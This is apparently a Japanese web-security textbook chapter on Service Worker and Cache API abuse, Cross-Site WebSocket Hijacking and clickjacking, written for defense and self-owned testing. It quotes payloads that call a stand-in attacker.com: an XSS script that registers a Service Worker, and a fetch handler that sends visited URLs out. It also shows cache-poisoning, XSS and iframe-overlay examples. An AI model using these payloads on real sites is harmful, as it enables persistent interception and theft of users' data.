# 第8章 発展的なクライアントサイド技術領域


## Service Worker と Cache API の攻撃面

Service Worker（以下 SW）は、ページとネットワークの「あいだ」に常駐して通信を横取りできる、ブラウザ内のプロキシのような実行環境である。オフライン対応やプッシュ通知を実現する正規の技術だが、その「常駐する」「通信を横取りできる」という性質ゆえに、**XSS（クロスサイトスクリプティング）の被害を単発で終わらせず、長期間の永続化（persistence）とネットワーク盗聴に拡張する土台**になりうる。本節では、防御・自己所有環境での診断という観点から、SW と Cache API がなぜ攻撃面になるのか、そしてブラウザ側がどんな設計上の境界でそれを封じ込めているのかを、仕組みのレベルで解説する。

> 本節はすべて防御・自己所有環境での診断を目的とする。実在サービスや本番環境への無許可検証、破壊的な手順は扱わない。以降のコード例は、自分で立てた検証用オリジン（`https://localhost` など自己管理下の Secure Context）で挙動を確認する前提である。

### 前提知識：Service Worker とは何か、なぜ危険な素材なのか

まず用語をかみ砕く。

- **Service Worker（SW）**：あるオリジンに登録される、イベント駆動のバックグラウンドスクリプト。DOM には直接触れられないが、`fetch` イベントを購読することで、そのオリジン配下のページが出すネットワークリクエストを丸ごと横取り（intercept）し、任意のレスポンスを返せる。
- **スコープ（scope）**：SW が制御できる URL パスの範囲。`scope: '/'` なら、そのオリジンの全パス配下のリクエストを制御下に置く。
- **Secure Context（安全なコンテキスト）**：`https://` か `localhost` のように、通信路の完全性が担保された文脈。SW はここでしか登録・利用できない。
- **Cache API**：SW などから使える、リクエスト/レスポンスのペアを永続保存するストレージ。`caches.open(name)` で名前付きキャッシュを開き、`cache.match(request)` で保存済みレスポンスを引ける。SW が「オフラインでも動く」のは、このキャッシュから応答を返すからである。
- **sink（シンク）**：入力が最終的に実行・解釈される危険な代入先。SW の文脈では、`importScripts(url)`（外部スクリプトを同期ロードして実行する）が代表的な sink である。

SW が攻撃の素材として危険なのは、次の3つの性質が重なるからだ。

1. **常駐性・永続性**：一度登録された SW の登録情報は、IndexedDB のストレージと同様、明示的に消さない限り**無期限に残る**（Chromium 公式 FAQ の "Registrations persist indefinitely" の記述）。ページを閉じても、ブラウザを再起動しても生き続ける。
2. **ネットワーク横取り**：スコープ内の全リクエストに `fetch` ハンドラが割り込める。攻撃者が制御する SW は、被害者が見るページの内容を改ざんしたり、送信データを外部へコピーしたりできる。
3. **イベントで蘇る**：SW は常時走っているわけではない（Chrome は 30 秒アイドルで停止する）。しかし、対象ページへのアクセスやプッシュ等のイベントが来るたびにブラウザが起こす。つまり「消したはずの XSS」が、SW という形で被害者のブラウザに埋め込まれ、後日再訪しただけで再発動しうる。

この「XSS → SW 登録 → 永続化」という昇格こそが、本節の中心テーマである。

### 攻撃の全体像：XSS を永続的なバックドアに変える

HackTricks の記事は、SW を悪用する前提条件を明快に示す。攻撃者が必要とするのは、次のいずれかの組み合わせである。

- 「**任意の JS ファイルをサーバにアップロードする手段**と、その SW を読み込ませる **XSS**」
- あるいは「**出力を操作できる脆弱な JSONP リクエスト**」と XSS の組み合わせ

ここで重要なのは、**SW スクリプトの本体は必ず被害者オリジンから配信されなければならない**という制約である（同一オリジン制約。後述）。だから攻撃者は「攻撃者サーバに置いた `evil.js` を直接 SW にする」ことはできない。被害者オリジン上に JS を置ける経路（アップロード機能、出力を操作できる JSONP、あるいはオープンリダイレクトを介した経路など）が別途必要になる。XSS 単体では足りず、「オリジン上にスクリプトを配置する能力」との合わせ技が要る、というのが SW 悪用の勘所だ。

登録に使われる典型的なペイロードは次の通り。XSS で被害者のページ上にこのスクリプトを実行させる。

```html
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

**なぜこう書くのか**を分解する。

- `navigator.serviceWorker.register(sw, {scope: '/'})` が SW 登録 API の本体。第1引数 `sw` は**被害者オリジン上の相対パス**（`/uploaded/ws_js.js`）でなければならない。攻撃者はここに、事前にアップロードした悪性スクリプトを指す。
- `{scope: '/'}` でスコープをオリジン全体に広げ、そのサイトの全ページの通信を制御下に置く狙い。
- `.then(...) / function(err){...}` の分岐で、`attacker.com` に成否を通知している。攻撃者は「どの被害者で登録が成功したか」を収集できる。
- `window.addEventListener('load', ...)` でページのロード完了を待つのは、`navigator.serviceWorker` が確実に使える状態を保証するため。

登録後、被害者オリジンから配信される悪性 SW 本体（`ws_js.js`）が、スコープ内の通信を横取りする。HackTricks が示す `fetch` 横取りの実装は次の通り。

```javascript
self.addEventListener("fetch", (event) => {
  event.waitUntil(
    fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {
      mode: "no-cors",
    }).catch(() => {}),
  )
  event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))
})
```

**なぜこれが盗聴になるのか**を仕組みで説明する。

- `self.addEventListener("fetch", ...)` は、SW のスコープ内で発生する**あらゆるネットワークリクエスト**をイベントとして受け取る。ページが読み込む画像・API 呼び出し・遷移、そのすべてが `event.request` として渡ってくる。
- `fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {mode:"no-cors"})` が漏えいの核心。被害者がアクセスした URL（クエリ文字列に機微情報が載ることも多い）を、丸ごと攻撃者サーバへ送り出している。`mode:"no-cors"` は、CORS のプリフライトやレスポンス読み取り制限を回避して「送るだけ」を成立させるための指定。攻撃者は応答を読む必要がなく、URL がサーバのアクセスログに残ればよいので、これで十分機能する。
- `event.waitUntil(...)` は、この送信処理が完了するまで SW を生かしておくための呼び出し（後述のアイドル停止で処理が途中終了するのを防ぐ）。
- `event.respondWith(caches.match(event.request).then(r => r || fetch(event.request)))` で、被害者には正常な応答を返す。まず Cache API に保存済みなら（`caches.match`）それを返し、無ければ本物のネットワーク（`fetch(event.request)`）から取得する。**被害者にとっては何も壊れていないように見える**ため、攻撃が発覚しにくい。ここに攻撃者が改ざんしたレスポンスを混ぜれば、コンテンツ改ざんや偽ログインフォームの注入も可能になる。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### importScripts と CSP バイパス、DOM Clobbering との連鎖

SW 内では `importScripts(url)` で外部スクリプトを同期的に読み込んで実行できる。これが強力な sink になる。HackTricks は、これが「**CSP 保護すら回避しうる**」と指摘する。

**なぜ CSP を回避しうるのか**：ページに適用される Content-Security-Policy は、SW スクリプト自身のレスポンスに付けられた CSP で制御されるべきものであり、ページ側の `script-src` 制約とは別系統である。SW スクリプトのレスポンスに `importScripts` の読み込み元を縛る CSP が付いていなければ、SW 内の `importScripts` は任意オリジンのスクリプトを引き込めてしまう。だからこそ Chromium FAQ は「サイト運営者は SW スクリプトのレスポンスに CSP ヘッダを付け、`importScripts()` の読み込み元を制限すべき」と明記している。

脆弱なパターンは、`importScripts` に渡す URL を外部入力から組み立てるコードである。

```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
```

**なぜ危険か**：`host` の値が攻撃者の制御下にあれば、`https://attacker.com//sw_extra.js` のように攻撃者オリジンのスクリプトを SW 内で実行できてしまう。HackTricks は、この `host` パラメータが**DOM Clobbering**（HTML 要素の `id`/`name` 属性で JS のグローバル変数やプロパティを上書きし、値を注入する技法）で制御可能になるケースを挙げている。つまり「入力が直接クエリから来ていなくても、DOM 経由で汚染される」ため、`importScripts` の引数が完全に固定文字列でない限り疑う必要がある。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### 更新の仕組みと永続化の上限、そしてキルスイッチ

SW の永続化はどこまで続くのか。ここはバージョン非依存の仕様レベルの挙動として、Chromium 公式 FAQ が明確な数値を示している（2024〜2026 年時点の現行仕様）。

- **登録は無期限に残る**（"Registrations persist indefinitely, similar to IndexedDB storage."）。
- しかし**ブラウザは 24 時間ごとに SW スクリプトを再検証（revalidate）する**。この再検証では HTTP キャッシュを無効化して取りに行くため、「古いコードが永遠に走り続ける」ことは防がれる（"Browsers revalidate scripts every 24 hours, invalidating HTTP cache to prevent indefinite stale code execution."）。
- つまり**攻撃者が確実に握れる永続化の窓は最大 24 時間**である。HackTricks も「The maximum persistence window extends 24 hours due to cache revalidation requirements」と一致した見解を示す。

この 24 時間更新チェックは、防御側にとって**キルスイッチ（kill-switch）**の根拠になる。HackTricks・Chromium FAQ の両方が、悪性 SW を排除する手段としてこれを推奨している。

- **キルスイッチ SW を配布する**：同じスクリプトパスに、自分自身を登録解除しキャッシュを一掃する SW を置く。24 時間以内の再検証で悪性 SW が「更新」され、無害化される。

```javascript
// 防御用キルスイッチ SW（自己所有オリジンでの是正用）
self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", async () => {
  const keys = await caches.keys();
  await Promise.all(keys.map((k) => caches.delete(k))); // Cache API の中身を消去
  await self.registration.unregister();                 // 自身の登録を解除
  const clients = await self.clients.matchAll();
  clients.forEach((c) => c.navigate(c.url));             // 制御下のページを再読込
});
```

- **`Clear-Site-Data` ヘッダを使う**：`Clear-Site-Data: "storage"`（あるいは `"*"`）を返すと、SW 登録・Cache API・その他ストレージをブラウザにまとめて消去させられる。
- **SW スクリプトに短い TTL を設定し、意図しない SW リクエストを拒否する**：Chromium FAQ は、サーバが `Service-Worker` リクエストヘッダを見て、SW 化を意図しないパスへの要求には `400 Bad Request` を返すべきだとする。ブラウザは SW スクリプトを取りに行くとき `Service-Worker: script` ヘッダを付けるため、サーバ側で「このパスを SW にしてよいか」を判定できる。

なお、更新時の挙動には注意点がある。HackTricks は「古い worker は、変更後のスクリプトが取得・インストール・アクティベートされるまで動き続ける（"the old worker can remain active until a changed script is fetched, installed, and activated"）」と述べる。**新しい SW は即座に置き換わるのではなく、いったん waiting 状態に入り、既存のページ（クライアント）が全部閉じられるか `skipWaiting()` が呼ばれて初めてアクティブ化される**という SW のライフサイクルに由来する挙動だ。だからキルスイッチ SW でも `self.skipWaiting()` と `clients.claim()` 相当を明示して、置き換えを急がせるのが定石になる。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers
> 出典: Service Worker Security FAQ（Chromium） — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md

### 検出とツール

診断・是正の第一歩は「今どんな SW が登録されているか」の把握である。

- **Chrome DevTools**：`Application` パネルの **Service Workers** セクションで、登録済み SW のスコープ・状態（installing/waiting/active）・ソースを確認でき、その場で `Unregister` できる。同パネルの **Cache Storage** で Cache API の中身も閲覧できる。HackTricks も「Service workers can be inspected ... from the Service Workers section of Chrome DevTools」と案内している。
- **`chrome://serviceworker-internals/`**：ブラウザ全体で登録されている SW を一覧できる内部ページ。
- **Shadow Workers**：HackTricks は、SW 悪用に特化した C2（command-and-control）フレームワークとして "Shadow Workers" を挙げている（"a command-and-control framework dedicated to service-worker exploitation"）。攻撃者側のツールだが、防御側は「SW を C2 として悪用する現実的な攻撃ツールが存在する」という事実を脅威モデルに織り込むべきである。本節では防御目的の把握にとどめ、攻撃手順は扱わない。

> 出典: Abusing Service Workers（HackTricks） — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers

### ブラウザ側の設計境界：なぜ被害が「そこまで」で止まるのか

攻撃面を正しく評価するには、ブラウザが SW を封じ込めるためにどんな境界を引いているかを理解する必要がある。Chromium 公式 FAQ は、その設計判断を整理している。以下、境界ごとに「なぜその制約があるか」を補う。

#### 同一オリジン制約とスコープ照合

- SW は**呼び出し元と同一オリジンでのみ動く**（"Service Workers must run in the same origin as their callers."）。**SW をクロスオリジンに登録することはできない**。これが「攻撃者は被害者オリジン上にスクリプトを置けなければならない」という前述の制約の根拠であり、XSS 単体で完結しない理由である。
- スコープ照合は**厳密なオリジン一致ではなく、URL の最長プレフィックス一致（longest-prefix / URL prefix comparison）**で行われる。FAQ はこれを「仕様上の隙間であり脆弱になりうるが、現時点では悪用不能」と率直に認めている。
- ただしプレフィックス照合はパスを含めて行われるため、`https://example.com/` と `https://example.com.evil.com/` は**別物として正しく区別される**。ホスト名の接尾辞トリックで別オリジンを乗っ取ることはできない。

**なぜ最長プレフィックス一致なのか**：SW のスコープは「このパス配下を制御する」という設計であり、`/app/` に登録された SW が `/app/page1`, `/app/page2` を制御できるようにするには、オリジン一致ではなくパス接頭辞での照合が自然だからだ。この設計上の緩さを FAQ 自身が「fragile」と評価している点は、診断時に頭の片隅に置く価値がある。

#### HTTPS（Secure Context）必須

- **Secure Context だけが SW を登録・利用できる**（"Only Secure Contexts can register or use Service Workers."）。

**なぜか**：SW は通信を横取りする強力な存在であり、中間者攻撃者が平文（HTTP）通信に悪性 SW を注入できてしまえば、被害は甚大になる。そこで「通信路の完全性が担保された文脈」でしか動かさない、という前提で危険性を封じている。

#### サードパーティ iframe とパーティション

- サードパーティ `iframe` は、**それ自身と親がすべて Secure Context である場合に限り** SW を登録できる。さらにこれらの登録は**トップレベルサイト（top-level site）でパーティション分割**される。

**なぜパーティションするのか**：これは近年（2020 年代前半以降）のプライバシー保護・ストレージ分割の流れに沿う。あるサイト A に埋め込まれた広告 iframe が登録した SW を、別サイト B に埋め込まれた同一ドメインの iframe と共有させないことで、クロスサイトのトラッキングや汚染を防いでいる。

#### 実行時間の制限とアイドル停止

- Chrome は**アイドルの SW を 30 秒で停止**する。イベント処理が 5 分を超える、あるいは同期処理で 30 秒応答しない SW は強制停止される。

**なぜか**：SW は無期限に「登録」されていても、常時 CPU を食うわけにはいかない。イベント駆動で必要なときだけ起き、終わったら止まる設計により、悪性 SW が背後で延々と計算資源を消費し続けることを構造的に抑えている。前掲の `event.waitUntil` は、この停止に処理を殺されないための保険である。

#### JS MIME タイプの強制とユーザープロンプト非採用

- 仕様は SW スクリプトに**正しい JavaScript の MIME タイプ**を要求する。これにより、攻撃者がペイロードを JPEG 等の非スクリプト形式に偽装して SW 化することを防ぐ。
- Chrome は SW 登録時に**ユーザーへの許可プロンプトを出さない**。FAQ はその理由を「キャッシュや CPU といったリソース利用の可否は、文脈を十分に理解できないユーザーに問うより自動で扱うほうが適切だから」と説明している（特に iframe が引き起こす API について）。

**診断上の含意**：登録にプロンプトが出ないということは、**XSS が成立すれば被害者に一切気づかれずに SW が仕込まれる**ことを意味する。だからこそ、CSP による XSS の予防、`importScripts` 元の制限、そして前述のキルスイッチ・`Clear-Site-Data` による事後是正の三段構えが、防御設計として重要になる。

#### SW が「できないこと」

FAQ は SW の能力上限も列挙する。SW は次のことができない。

- ユーザー許可が必要な API（位置情報・カメラ・マイク・USB・Bluetooth）を、事前許可なしに使うこと。
- オリジンをまたいで動くこと。
- ハンドラを起動するイベントなしに実行すること。
- ユーザー許可なしにプッシュ通知をポーリングすること。

これらは「悪性 SW を仕込まれても、それだけで端末のカメラを乗っ取られたりはしない」という被害範囲の上限を意味する。SW の脅威は主に**ネットワーク横取り・コンテンツ改ざん・永続化・情報漏えい**に集約される、と整理できる。

> 出典: Service Worker Security FAQ（Chromium） — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md

### Cache API 独自の攻撃面

最後に、SW としばしばセットで語られる Cache API 自体の攻撃面を、専門知識に基づいて補足する（以下は原典2件の記述を踏まえた一般知識に基づく解説である）。

Cache API（`caches`）は SW 経由でなくても、ページの JS からも Secure Context であれば利用できる。攻撃面として押さえるべき点は次の通り。

- **キャッシュ汚染（cache poisoning）による永続改ざん**：XSS を得た攻撃者は、`caches.open()` でキャッシュを開き、`cache.put(request, new Response(悪性HTML))` のように**任意のレスポンスを被害者オリジンのキャッシュに書き込める**。SW の `fetch` ハンドラが `caches.match()` を優先して返す実装（前掲の例がまさにそれ）だと、この汚染キャッシュが正規ページの代わりに返され続ける。ネットワーク上のサーバは無傷なのに、被害者のブラウザ内でだけコンテンツが書き換わる、という検知しにくい状態を作れる。

```javascript
// 自己所有オリジンでのキャッシュ汚染の再現（診断用）
const cache = await caches.open("v1");
await cache.put(
  new Request("/index.html"),
  new Response("<h1>tampered</h1>", { headers: { "Content-Type": "text/html" } })
);
```

  **なぜ持続するか**：Cache API のエントリは、SW の登録と同様に明示的に削除されるまで残る。ページを閉じても消えないため、SW と組み合わせると「サーバを直しても被害者環境だけ汚染が残る」事態になりうる。是正には前述の `Clear-Site-Data` や、キルスイッチ SW での `caches.delete()` が必要になる。

- **機微データがキャッシュに残る情報漏えい**：認証済み API 応答や個人情報を安易に Cache API へ入れると、共有端末で後続ユーザーが `caches` から読み出せてしまう。Cache API はオリジン単位で隔離されるが、**同一オリジン内の別スクリプト（XSS 含む）からは読める**点に注意が要る。
- **是正の一貫性**：Cache Storage は DevTools の `Application > Cache Storage` で内容確認・削除ができる。SW を消しても Cache が残ると再汚染の温床になるため、SW 登録解除と Cache 削除は必ずセットで行う。

以上を総合すると、SW と Cache API の攻撃面の本質は「**Secure Context 上で、同一オリジンに配置できたコードが、通信横取り（SW）と永続ストレージ（Cache API）を握ることで、単発の XSS を被害者ブラウザ内の長期的なバックドアへ昇格させる**」点にある。ブラウザは同一オリジン制約・HTTPS 必須・24 時間再検証・パーティション分割で被害を封じているが、最終防衛線は「XSS を出さないこと」と「万一に備えたキルスイッチ・`Clear-Site-Data` の運用」であることを、診断・防御の結論として押さえておきたい。

## WebSocketとフレーミング（clickjacking）

本節では、クライアントサイド攻撃面の中でも見落とされがちな2つの領域――**WebSocket通信の悪用**と**フレーミング（iframeによるUI偽装、いわゆるclickjacking）**――を扱う。両者は一見無関係に見えるが、「ブラウザが持つ暗黙の信頼関係（オリジン、セッションクッキー、UIの見た目）をどう悪用するか」という点で共通の思想を持つ。防御側としてこの仕組みを理解しておくことは、通常のHTTPリクエスト/レスポンスモデルの外側にある攻撃面を漏れなく検査するために不可欠である。

### WebSocketの基礎: ハンドシェイクの仕組み

WebSocketは、HTTP上で確立される**永続的・双方向**の通信チャネルである。通常のHTTPが「リクエストを送るたびに新しい応答を待つ」モデルであるのに対し、WebSocketは一度接続を確立すると、サーバー・クライアントの双方が任意のタイミングでメッセージを送信できる。チャットアプリ、リアルタイム通知、共同編集ツールなど、低遅延な双方向通信が必要な場面で広く使われている。

重要なのは、WebSocket接続は**通常のHTTPリクエストとして開始される**という点である。この開始処理を「ハンドシェイク」と呼ぶ。クライアントは以下のようなHTTPリクエストを送信する。

```
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: session=abc123...
Origin: https://example.com
```

ここでのポイントを仕組みレベルで整理する。

- **`Upgrade: websocket` / `Connection: Upgrade`**: 「このTCP接続をHTTPからWebSocketプロトコルに切り替えてほしい」というプロトコルネゴシエーションのシグナルである。サーバーがこれを受理すると`HTTP/1.1 101 Switching Protocols`を返し、以降その同じTCPコネクション上でWebSocketフレーム形式のデータがやり取りされる。
- **`Sec-WebSocket-Key`**: クライアントが生成するランダムなbase64値。サーバーはこの値に固定のGUID文字列を連結してSHA-1ハッシュを取り、base64エンコードした値を`Sec-WebSocket-Accept`としてレスポンスに含める。これは「プロキシなどが誤ってWebSocketハンドシェイクをキャッシュ・再送してしまう事故を防ぐための整合性チェック」であり、**認証やCSRF防御の仕組みではない**という点が重要である。つまりこの鍵交換自体はセキュリティ境界を提供しない。
- **`Cookie`**: ここが本節で最も重要な事実である。WebSocketのハンドシェイクは通常のHTTPリクエストとして送られるため、**そのオリジンに紐づくCookieが自動的に付与される**。これは通常の`<img>`タグや`fetch`によるクロスサイトリクエストと全く同じブラウザの挙動であり、WebSocket固有の仕組みではない。しかし、この事実が後述するCSWSH（Cross-Site WebSocket Hijacking）の土台になる。
- **`Origin`**: ブラウザが自動的に付与するヘッダーで、ハンドシェイクを開始したページのオリジンを示す。CSRF対策と同様に、**サーバー側がこの値を検証しない限り、攻撃者ページからのハンドシェイクを許してしまう**。

サーバーからの応答は以下のようになる。

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

この101応答をもってHTTPセマンティクスは終了し、以降は「フレーム」と呼ばれるバイナリ単位でメッセージが送受信される（フレームの内部フォーマットの詳細はRFC 6455に定義されるが、テスト実務上は「メッセージ単位で見える」ことが多く、深い理解は必須ではない）。

> 出典: WebSockets — https://portswigger.net/web-security/websockets

### WebSocketメッセージの傍受・改ざん

WebSocketが確立されると、その後のやり取りは通常のHTTPリクエストのようにブラウザのネットワークタブや通常のプロキシツールには（設定なしでは）見えにくい。防御・診断の観点では、Burp Suiteのようなインターセプトプロキシに専用の対応が必要になる。

- **Proxyでの傍受**: WebSocketメッセージのインターセプトを有効にすると、クライアント→サーバー、サーバー→クライアントの両方向のメッセージを、フォワードする前に閲覧・改変できる。
- **Repeaterでの再送・新規送信**: 選択したメッセージを編集し、何度も送り直すことができる。さらに、どちらの方向であっても新しいメッセージを生成して送信できるため、「本来クライアントが送るはずのないメッセージ」や「本来サーバーが送るはずのないメッセージ」を試験的に注入し、サーバー側・クライアント側の入力検証の有無を確認できる。
- **ハンドシェイクの再編集**: 接続済みのWebSocketにアタッチしたり、既存の接続を複製したり、切断された接続にヘッダーを変更した上で再接続したりすることができる。これにより、`Cookie`や`Origin`、カスタムヘッダーを変えた状態でハンドシェイクを再試行し、認可ロジックの穴を探ることができる。

この「メッセージ改ざん」という操作モデルが重要なのは、**WebSocket上でやり取りされるデータも、通常のHTTPパラメータと同じ扱いをすべき**だからである。

### 入力検証の観点: WebSocketでも「ふつうの脆弱性」が起きる

WebSocketは通信路であって、アプリケーションロジックの防御機構ではない。したがって、SQLインジェクション、XXE、そして本教科書のテーマであるクライアントサイドの脆弱性――特にDOM based XSS――は、WebSocket経由で受け渡される値がsink（入力が最終的に実行・解釈される危険な代入先。ここでは「DOMに書き込まれる場所」を指す）に到達すれば同様に発生する。

具体例として、チャット機能がWebSocketメッセージをそのまま画面に描画するケースを考える。攻撃者が次のようなメッセージを送信したとする。

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

もしサーバーまたはクライアントの受信処理がこの`message`フィールドの値をエスケープせずにDOMへ挿入していれば（例えば`innerHTML`への代入）、`<img>`タグの読み込みエラー時に発火する`onerror`ハンドラを通じて任意のJavaScriptが実行される。これは通常のリフレクテッド/ストアドXSSと機構的には同一であり、「入力の経路がHTTPパラメータではなくWebSocketメッセージである」という点のみが異なる。**つまり、WebSocketを使うアプリケーションを診断・防御する際にも、これまでの章で学んだsink分析（`innerHTML`、`document.write`、`eval`、`location`代入など危険な代入先を特定し、そこに到達する入力を追跡する手法)をそのまま適用すべきである。**

> 出典: WebSockets — https://portswigger.net/web-security/websockets

### Cross-Site WebSocket Hijacking（CSWSH）

CSWSHは、WebSocketハンドシェイクに対するCSRF（Cross-Site Request Forgery）と表現するのが最も分かりやすい。仕組みは次の通りである。

1. 被害者は`example.com`にログイン済みで、セッションCookieを保持している。
2. 攻撃者が用意した悪意あるページ（`attacker.com`）を被害者が開く。
3. そのページのJavaScriptが`new WebSocket("wss://example.com/chat")`のようにクロスオリジンでWebSocket接続を開始する。
4. ブラウザは通常のクロスサイトリクエストと同様に、ハンドシェイク時に`example.com`宛のCookieを自動的に付与する。
5. サーバー側が`Origin`ヘッダーを検証していない、あるいはハンドシェイクにCSRFトークンなどの防御が組み込まれていない場合、サーバーは被害者のセッションとして接続を確立してしまう。
6. 確立後は攻撃者の任意のJavaScriptがそのWebSocketを通じて被害者権限でメッセージを送受信できるため、「被害者に代わって特権操作を実行する」「被害者宛に送られてくる機密データを盗聴する」ことが可能になる。

ここで仕組みレベルで押さえるべきなのは、**CORS（Cross-Origin Resource Sharing）の同一オリジンポリシーがWebSocketには通常のfetch/XHRと同じ形では効かない**という点である。通常のクロスオリジンfetchはブラウザのCORSチェック（プリフライトや`Access-Control-Allow-Origin`の検証）によって、レスポンスをJavaScriptから読み取れるかどうかが制御される。しかしWebSocketのハンドシェイクにはCORSのプリフライト機構が適用されず、接続確立の可否は**サーバー側が`Origin`ヘッダーを自前で検証するかどうかにのみ依存する**。この非対称性――「Cookieは自動送信されるが、CORSのような組み込みのオリジン制限は働かない」――こそがCSWSHを成立させる根本原因である。

また、通常のCSRFであれば攻撃は「1回のリクエストを偽造して送る」形が多いが、WebSocketハイジャックでは接続が確立された後、**双方向かつ持続的に**やり取りが継続する点が特徴的である。攻撃者は接続確立後に任意のメッセージを送り続けることができ、サーバーからのレスポンス（機密情報を含む場合もある）を継続的に受信し続けることも可能になる。

> 出典: WebSockets — https://portswigger.net/web-security/websockets

### WebSocketに関する防御策

原典が示す推奨事項を、仕組みの理解と合わせて整理する。

- **`wss://`（TLS上のWebSocket）を使用する**: 平文の`ws://`では通信内容が中間者に盗聴・改ざんされる。TLSによる暗号化はHTTPSと同様の保護を提供する。
- **WebSocketエンドポイントのURLをハードコードし、ユーザー制御可能なデータを含めない**: 接続先URLにユーザー入力を組み込むと、オープンリダイレクトやSSRF的な誘導に悪用される余地が生まれる。
- **ハンドシェイクをCSRFから保護する**: 具体的には、`Origin`ヘッダーを許可リストと照合する、ハンドシェイクリクエストに予測不能なCSRFトークンを含めてサーバー側で検証する、といった対策が有効である。**Cookieだけに依存した認証は、WebSocketにおいても通常のCSRF同様に脆弱である**ことを忘れてはならない。
- **WebSocket経由のデータを双方向とも「信頼できない入力」として扱う**: サーバー側・クライアント側の双方で、受信したデータに対して適切なサニタイズ・エスケープ・型検証を行う。特にクライアント側でメッセージ内容をDOMに描画する処理がある場合は、本教科書で扱ってきたDOM based XSS対策（安全なAPI、例えば`textContent`の使用や信頼できるライブラリによるサニタイズ）をそのまま適用する。

これらはすべて「WebSocketは新しい脆弱性を生む魔法の技術ではなく、既存の脆弱性クラス（CSRF、XSS、SQLi等）が新しい通信経路に現れているだけである」という原則に集約される。

> 出典: WebSockets — https://portswigger.net/web-security/websockets

---

### Clickjacking（UI redressing）の基礎

Clickjackingは「UI redressing（UIの見た目をすり替える攻撃）」とも呼ばれ、ユーザーに**見えているものと実際にクリックしているものを乖離させる**ことで成立するインターフェース攻撃である。原典の定義を踏まえると、「ユーザーはデコイ（おとり）サイト上の何らかのコンテンツをクリックしたつもりが、実際には隠された別サイト上の操作可能なコンテンツをクリックさせられている」状態を指す。

ここで最初に押さえるべき重要な違いは、**Clickjacking ≠ CSRF**という点である。CSRFは被害者のブラウザに保存されたセッションを使って、被害者が気づかないうちにリクエストを偽造して送信する攻撃であり、ユーザーの能動的なクリックを必要としない場合が多い。一方Clickjackingは、**攻撃を成立させるために被害者自身の「本物のクリック」という能動的操作が不可欠**である。この違いは対策設計にも直結する。原典が明言する通り、「Clickjacking攻撃はCSRFトークンによっては緩和されない。なぜなら標的となるセッションは、正規のWebサイトから読み込まれたコンテンツによって確立されているから」である。つまり、被害者は攻撃者のサイトに認証情報を渡しているわけではなく、**自分の正規セッションで、正規のページに対して、正規の(と見せかけた)操作を実際に行ってしまう**。CSRFトークンは正規オリジンからのリクエストであれば正しく付与されるため、これを防げない。

### 攻撃の技術的構造: iframeの重ね合わせ

Clickjackingの基本形は、標的サイトを`<iframe>`として読み込み、それを**ほぼ完全に透明にした状態で**、攻撃者が用意したデコイページの見た目の上に正確に重ね合わせる、というものである。CSSのレイヤリングを用いた典型的な構造は次の通りである。

```html
<style>
  #target_website {
    position: relative;
    width: 500px;
    height: 500px;
    opacity: 0.00001;
    z-index: 2;
  }
  #decoy_website {
    position: absolute;
    top: 0;
    left: 0;
    width: 500px;
    height: 500px;
    z-index: 1;
  }
</style>
<div id="decoy_website">
  ここをクリックしてください（見た目上のボタンなど）
</div>
<iframe id="target_website" src="https://victim-site.example/delete-account"></iframe>
```

各プロパティが果たす役割を仕組みレベルで説明する。

- **`opacity: 0.00001`**: 完全な`opacity: 0`にすると、一部のブラウザではクリックイベントがiframeを素通りしてしまう（要素が「存在しない」ものとして扱われる挙動があるため）。限りなくゼロに近い、しかしゼロではない値を使うことで、視覚的には不可視でありながらクリックを正しく受け取れる状態を維持する、という細かい実装上のノウハウである。
- **`z-index`**: スタック順を制御する。`target_website`（本物のiframe）を`decoy_website`（見た目のコンテンツ)より**上のレイヤー**に置くことで、ユーザーがクリックした座標のイベントは実際には最上位にある透明なiframe、すなわち標的サイトのボタンに届く。ユーザーの目には下のレイヤーのデコイ要素しか見えていないため、「クリックしたつもり」の対象と「実際にクリックされた」対象がすり替わる。
- **`position: absolute` / `relative`**: 座標系を明示的に固定し、ブラウザ間・画面サイズ間でズレなくiframeとデコイを正確に重ね合わせるために使われる。

この基本形の応用として、**フォームの事前入力(prefilled form input)を悪用する攻撃**がある。標的サイトがGETパラメータでフォームフィールドの値を事前入力できる仕様を持っている場合、攻撃者はそのパラメータに悪意ある値（例えば送金先口座や新しいメールアドレス）を埋め込んだURLをiframeのsrcに指定する。ユーザーには「送信」ボタンに見える透明な送信ボタンだけを踏ませることで、事前入力済みの悪意あるフォームを本人に送信させる。

さらに、単一のクリックでは完結しない操作（例えば「商品をカートに追加してからチェックボタンを押す」といった複数ステップの操作)に対しては、**複数のiframeやオーバーレイ層を段階的に重ね、被害者の複数回のクリックをそれぞれ別の標的操作に誘導する多段階（multistep）Clickjacking**が使われる。

